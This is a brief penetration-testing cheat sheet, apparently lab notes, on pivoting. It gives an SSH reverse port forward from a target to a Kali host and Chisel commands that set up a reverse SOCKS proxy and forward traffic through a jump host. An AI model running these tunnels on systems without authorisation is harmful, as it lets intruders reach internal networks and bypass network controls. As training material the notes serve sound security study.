## SSH 
target machine on port 8000 and in our machine in 7560
```
ssh -N -R 127.0.0.1:7560:127.0.0.1:8000 kali@192.168.45.175
```
## Chisel
on target machine
```
./chisel client 192.168.45.165:8001 R:socks
```
on kali
```
chisel server --port 8001 --reverse
```

to forward
```
chisel client 192.168.45.165:8001 R:Internal-IP:Jump-Host-IP:80
```
